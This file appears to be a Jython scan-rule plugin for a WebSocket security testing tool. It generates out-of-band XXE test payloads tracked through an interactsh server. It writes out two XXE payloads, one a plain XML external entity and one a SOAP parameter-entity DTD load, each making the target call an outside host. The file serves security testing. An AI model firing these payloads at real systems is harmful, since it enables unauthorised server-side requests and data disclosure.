from com.mitmws.mvc.model import InteractShTestPayload
from com.mitmws.anomalydetection import DetectionRuleSelfTestStatus
from com.mitmws.anomalydetection import DetectedAnomaly
from java.util import ArrayList

def getName():
    return "Interactsh OOB tests for XXE"
    
def getActiveRuleType():
    return "PAYLOAD-INTERACTSH"

def getDescription():
    return "If an interactsh server is available XXE tests will be generated using a trackable id"

def getCategory():
    return "XXE"
    
def getFrameScope():
  return ["TEXT","PING","PONG","CLOSE","BINARY","CONTINUATION"]

def getTestScope():
  return "APPLICATION"

def getOOBPayloads( interactsh ):
    payloads = []
    payload = interactsh.getPayload();
    payloads.append(InteractShTestPayload("<?xml  version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://" + payload + "\" >]><foo>&xxe;</foo>",payload))

    payload = interactsh.getPayload();
    payloads.append(InteractShTestPayload("<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM " + payload + "> %dtd;]><xxx/>]]></foo></soap:Body>",payload))

    return payloads
  
def analyze( websocket_messages ):
    anomalies = ArrayList()
    return anomalies

def selfTest():
    result = DetectionRuleSelfTestStatus()
    result.setSelfTestOK(True)
    return result
